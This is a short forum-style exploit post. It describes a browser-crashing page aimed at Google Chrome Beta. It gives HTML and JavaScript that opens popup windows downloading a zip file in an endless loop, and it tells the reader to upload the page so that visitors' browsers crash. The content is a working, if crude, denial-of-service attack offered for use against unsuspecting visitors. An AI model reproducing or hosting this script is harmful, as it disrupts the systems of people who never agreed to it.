Google's new web browser Google Chrome will download files without
the user permission. So I came up with a script that will download
a file over and over again causing Google Chrome Beta to crash. 

First start off by making a document called crash.html, Than add the 
following script to the document.

<SCRIPT LANGUAGE="JavaScript">
document.write
{
var iCounter = 0
while (true)
{
window.open("owned.zip","Grahamizgod" + iCounter,"width=1,height=1,resizable=no")
iCounter++
}
}
</script>

Than save the file, create a zip file called owned and just putta 
buncha stuff in it. Than upload the page and than when someone 
vists that page, Google chrome will give the error, "Google Chrome, 
Woah! Google Chrome has crashed. Restart now?"
